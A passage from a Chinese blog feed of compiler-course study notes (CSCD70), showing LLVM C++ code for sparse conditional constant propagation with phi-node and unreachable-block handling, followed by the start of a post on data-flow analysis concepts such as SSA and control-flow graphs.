class="built_in">getConstantValue</span>(Inst,IDV);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>对于phi指令需要特化,原因有二:<br>    1. phi的结果为CONST,需要其操作数全为CONST,且值相同.<br>    2. phi的某个操作数若来自NeverReachBB时,不做考虑.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ifphi)</span><br><span class="line">{</span><br><span class="line">  <span class="comment">//特化phi,与其他的操作符有不同的规则</span></span><br><span class="line">  dfa::Constant r = {.Status=dfa::UNDEF};</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">  {</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="type">const</span> PHINode* phiNode = <span class="built_in">dyn_cast</span>&lt;PHINode&gt;(&amp;Inst))</span><br><span class="line">    {</span><br><span class="line">      <span class="comment">//如果phi的某个值来自NeverReachBB,不与其进行Meet操作.</span></span><br><span class="line">      <span class="keyword">if</span>((NeverReachBBs.<span class="built_in">find</span>(phiNode-&gt;<span class="built_in">getIncomingBlock</span>(operand)))!=NeverReachBBs.<span class="built_in">end</span>())</span><br><span class="line">      {</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(!flag)</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">          {</span><br><span class="line">            r = r &amp; (IDV.<span class="built_in">at</span>(id2));</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(!flag)</span><br><span class="line">        {</span><br><span class="line">          r = r &amp; dfa::<span class="built_in">Constant</span>({.Value=<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(operand)-&gt;<span class="built_in">getSExtValue</span>(),.Status=dfa::CONST});</span><br><span class="line">        }</span><br><span class="line">      }    </span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  NewODV.<span class="built_in">at</span>(id1) = r;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Never-Reach-Basic-Block"><a href="#Never-Reach-Basic-Block" class="headerlink" title="Never Reach Basic Block"></a>Never Reach Basic Block</h5><p>对于跳转指令,判断其条件是否恒真或恒假来更新NeverReachBB.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据跳转条件是否为常量来</span></span><br><span class="line"><span class="comment">//修改要操作的基本块集合</span></span><br><span class="line"><span class="keyword">if</span>(Inst.<span class="built_in">getOpcode</span>()==Instruction::Br) </span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(Inst.<span class="built_in">getNumOperands</span>()==<span class="number">3</span>) <span class="comment">//只处理条件跳转</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">auto</span> condition = Inst.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">bool</span> ifconst = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int64_t</span> truth;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(condition))</span><br><span class="line">    {</span><br><span class="line">      <span class="type">int64_t</span> id;</span><br><span class="line">      <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(condition))!= <span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(IDV.<span class="built_in">at</span>(id).Status == dfa::CONST)</span><br><span class="line">        {</span><br><span class="line">          ifconst = <span class="literal">true</span>;</span><br><span class="line">          truth = IDV.<span class="built_in">at</span>(id).Value;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      ifconst = <span class="literal">true</span>;</span><br><span class="line">      truth = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(condition)-&gt;<span class="built_in">getSExtValue</span>();</span><br><span class="line">    }    </span><br><span class="line">    <span class="keyword">if</span>(ifconst)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(truth)</span><br><span class="line">      {</span><br><span class="line">        NeverReachBBs.<span class="built_in">insert</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">1</span>)));</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        NeverReachBBs.<span class="built_in">insert</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">2</span>)));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      NeverReachBBs.<span class="built_in">erase</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">1</span>)));</span><br><span class="line">      NeverReachBBs.<span class="built_in">erase</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">2</span>)));</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h5 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h5><p>唉,本来想写得优雅一点的,改着改着就成这样了…<br>ps: calc只处理了测试用例中有的指令.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SCCP::InitializeDomainFromInstruction</span><span class="params">(<span class="type">const</span> llvm::Instruction&amp; In)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : In.<span class="built_in">operands</span>())</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(operand)||<span class="built_in">isa</span>&lt;Argument&gt;(operand))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>((DomainIdMap.<span class="built_in">emplace</span>(std::<span class="built_in">pair</span>(operand.<span class="built_in">get</span>(),DomainIdMap.<span class="built_in">size</span>()))).second)</span><br><span class="line">      {</span><br><span class="line">        DomainVector.<span class="built_in">push_back</span>(operand.<span class="built_in">get</span>());</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">calc</span><span class="params">(<span class="type">int64_t</span>&amp; result,<span class="type">const</span> std::vector&lt;<span class="type">int64_t</span>&gt;&amp; val,<span class="type">const</span> Instruction&amp; In)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">  {</span><br><span class="line">  <span class="keyword">case</span> Instruction::Add:</span><br><span class="line">    result += val.<span class="built_in">at</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">case</span> Instruction::ICmp:</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">auto</span> IcmpIn = <span class="built_in">dyn_cast</span>&lt;ICmpInst&gt;(&amp;In))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">switch</span> (IcmpIn-&gt;<span class="built_in">getPredicate</span>())</span><br><span class="line">      {</span><br><span class="line">      <span class="keyword">case</span> ICmpInst::ICMP_SLT:</span><br><span class="line">        result = (val[<span class="number">0</span>] &lt; val[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int64_t</span> <span class="title">SCCP::getConstantValue</span><span class="params">(<span class="type">const</span> Instruction&amp; In,<span class="type">const</span> DomainVal_t &amp;IDV)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int64_t</span> result;</span><br><span class="line">  std::vector&lt;<span class="type">int64_t</span>&gt; val_list;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : In.<span class="built_in">operands</span>())</span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">    {</span><br><span class="line">      <span class="type">int64_t</span> id;</span><br><span class="line">      <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!=<span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        val_list.<span class="built_in">push_back</span>(IDV.<span class="built_in">at</span>(id).Value);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      val_list.<span class="built_in">push_back</span>(<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(operand)-&gt;<span class="built_in">getSExtValue</span>());</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">calc</span>(result,val_list,In);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SCCP::transferFunc</span><span class="params">(<span class="type">const</span> Instruction &amp;Inst, <span class="type">const</span> DomainVal_t &amp;IDV,</span></span></span><br><span class="line"><span class="params"><span class="function">                             DomainVal_t &amp;ODV)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  DomainVal_t NewODV = IDV;</span><br><span class="line">  <span class="type">static</span> std::set&lt;BasicBlock*&gt;NeverReachBBs;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//对NeverReachBB不做处理</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; NeverReachBB : NeverReachBBs)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(Inst.<span class="built_in">getParent</span>()==NeverReachBB)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">//根据跳转条件是否为常量来</span></span><br><span class="line">  <span class="comment">//修改要操作的基本块集合</span></span><br><span class="line">  <span class="keyword">if</span>(Inst.<span class="built_in">getOpcode</span>()==Instruction::Br) </span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(Inst.<span class="built_in">getNumOperands</span>()==<span class="number">3</span>) <span class="comment">//只处理条件跳转</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">auto</span> condition = Inst.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="type">bool</span> ifconst = <span class="literal">false</span>;</span><br><span class="line">      <span class="type">int64_t</span> truth;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(condition))</span><br><span class="line">      {</span><br><span class="line">        <span class="type">int64_t</span> id;</span><br><span class="line">        <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(condition))!= <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span>(IDV.<span class="built_in">at</span>(id).Status == dfa::CONST)</span><br><span class="line">          {</span><br><span class="line">            ifconst = <span class="literal">true</span>;</span><br><span class="line">            truth = IDV.<span class="built_in">at</span>(id).Value;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        ifconst = <span class="literal">true</span>;</span><br><span class="line">        truth = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(condition)-&gt;<span class="built_in">getSExtValue</span>();</span><br><span class="line">      }    </span><br><span class="line">      <span class="keyword">if</span>(ifconst)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(truth)</span><br><span class="line">        {</span><br><span class="line">          NeverReachBBs.<span class="built_in">insert</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">1</span>)));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          NeverReachBBs.<span class="built_in">insert</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">2</span>)));</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        NeverReachBBs.<span class="built_in">erase</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">1</span>)));</span><br><span class="line">        NeverReachBBs.<span class="built_in">erase</span>(<span class="built_in">dyn_cast</span>&lt;BasicBlock&gt;(Inst.<span class="built_in">getOperand</span>(<span class="number">2</span>)));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="comment">//如果该指令是一次定义,设置该指令代表的变量为NAC</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(Inst)||<span class="built_in">isa</span>&lt;Argument&gt;(Inst))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; V : DomainVector)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(<span class="type">const</span> Instruction* InofV = <span class="built_in">dyn_cast</span>&lt;Instruction&gt;(V.Var))</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : InofV-&gt;<span class="built_in">operands</span>())</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span>(operand.<span class="built_in">get</span>() == &amp;Inst)</span><br><span class="line">            {</span><br><span class="line">              <span class="type">int64_t</span> id;</span><br><span class="line">              <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!=<span class="number">-1</span>)</span><br><span class="line">              {</span><br><span class="line">                NewODV.<span class="built_in">at</span>(id).Status = dfa::NAC;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="type">int64_t</span> id1,id2;</span><br><span class="line">      <span class="type">bool</span> ifnac = <span class="literal">false</span>;</span><br><span class="line">      <span class="type">bool</span> ifundef = <span class="literal">false</span>;</span><br><span class="line">      <span class="type">bool</span> ifphi = (Inst.<span class="built_in">getOpcode</span>() == Instruction::PHI);</span><br><span class="line">      <span class="keyword">if</span>((id1 = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!= <span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(ifphi)</span><br><span class="line">        {</span><br><span class="line">          <span class="comment">//特化phi,与其他的操作符有不同的规则</span></span><br><span class="line">          dfa::Constant r = {.Status=dfa::UNDEF};</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">          {</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="type">const</span> PHINode* phiNode = <span class="built_in">dyn_cast</span>&lt;PHINode&gt;(&amp;Inst))</span><br><span class="line">            {</span><br><span class="line">              <span class="comment">//如果phi的某个值来自NeverReachBB,不与其进行Meet操作.</span></span><br><span class="line">              <span class="keyword">if</span>((NeverReachBBs.<span class="built_in">find</span>(phiNode-&gt;<span class="built_in">getIncomingBlock</span>(operand)))!=NeverReachBBs.<span class="built_in">end</span>())</span><br><span class="line">              {</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">              }</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(!flag)</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">                  {</span><br><span class="line">                    r = r &amp; (IDV.<span class="built_in">at</span>(id2));</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(!flag)</span><br><span class="line">                {</span><br><span class="line">                  r = r &amp; dfa::<span class="built_in">Constant</span>({.Value=<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(operand)-&gt;<span class="built_in">getSExtValue</span>(),.Status=dfa::CONST});</span><br><span class="line">                }</span><br><span class="line">              }    </span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          NewODV.<span class="built_in">at</span>(id1) = r;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">                  {</span><br><span class="line">                    <span class="keyword">if</span>(IDV[id2].Status==dfa::NAC)</span><br><span class="line">                    {</span><br><span class="line">                      NewODV[id1].Status = dfa::NAC;</span><br><span class="line">                      ifnac = <span class="literal">true</span>;</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(IDV[id2].Status == dfa::UNDEF)</span><br><span class="line">                    {</span><br><span class="line">                      NewODV[id1].Status = dfa::UNDEF;</span><br><span class="line">                      ifundef = <span class="literal">true</span>;</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                    }</span><br><span class="line">                  }</span><br><span class="line">                }    </span><br><span class="line">              }</span><br><span class="line">              <span class="keyword">if</span>(!ifnac)</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(!ifundef)</span><br><span class="line">                {</span><br><span class="line">                  NewODV[id1].Status = dfa::CONST;</span><br><span class="line">                  NewODV[id1].Value = <span class="built_in">getConstantValue</span>(Inst,IDV);</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">          }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(NewODV==ODV)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    ODV = NewODV;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312142040420.png"></p><h2 id="Lazy-Code-Motion"><a href="#Lazy-Code-Motion" class="headerlink" title="Lazy Code Motion"></a>Lazy Code Motion</h2><p>实现了但效果不好,还是之前那个原因,SSA之后原来相同表达式已经分裂成了不同的表达式….<br>实现的方法看文章开头的数据流分析笔记.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 静态分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
            <tag> CSCD70 </tag>
            
            <tag> 数据流分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据流分析 学习笔记</title>
      <link href="/2023/DataFlow-Analysis/"/>
      <url>/2023/DataFlow-Analysis/</url>
      
        <content type="html"><![CDATA[<p>学习CSCD70 和 南京大学《软件分析》课程中数据流分析部分的笔记与思考.<br>ps: 本篇有许多个人观点,如有错误虚心求教.</p><h2 id="中间表示-IR"><a href="#中间表示-IR" class="headerlink" title="中间表示 IR"></a>中间表示 IR</h2><h3 id="静态单赋值-SSA"><a href="#静态单赋值-SSA" class="headerlink" title="静态单赋值 SSA"></a>静态单赋值 SSA</h3><p>静态单赋值（SSA），就是让每次对变量x赋值都重新使用一个新的变量xi，并在后续使用中选择最新的变量.<br>在控制流汇入同一个块时,导致多个变量备选,则使用合并操作符(phi-function),根据控制流的信息来决定选择哪个变量.</p><span id="more"></span><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101125383.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101127135.png"></p><h3 id="Basic-Blocks-Control-Flow-Graphs"><a href="#Basic-Blocks-Control-Flow-Graphs" class="headerlink" title="Basic Blocks &amp; Control Flow Graphs"></a>Basic Blocks &amp; Control Flow Graphs</h3><p>控制流分析（Control Flow Analysis）通常指的是构建控制流图（Control Flow Graph, CFG），并以 CFG 作为基础结构进行静态分析的过程。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101129080.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101132709.png"></p><h2 id="可用表达式-活跃变量-到达定值"><a href="#可用表达式-活跃变量-到达定值" class="headerlink" title="可用表达式,活跃变量,到达定值"></a>可用表达式,活跃变量,到达定值</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132214325.png"></p><p>一个易错的例子.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101557021.png"></p><p>经典的数据流分析算法,以到达定值为例.<br><img 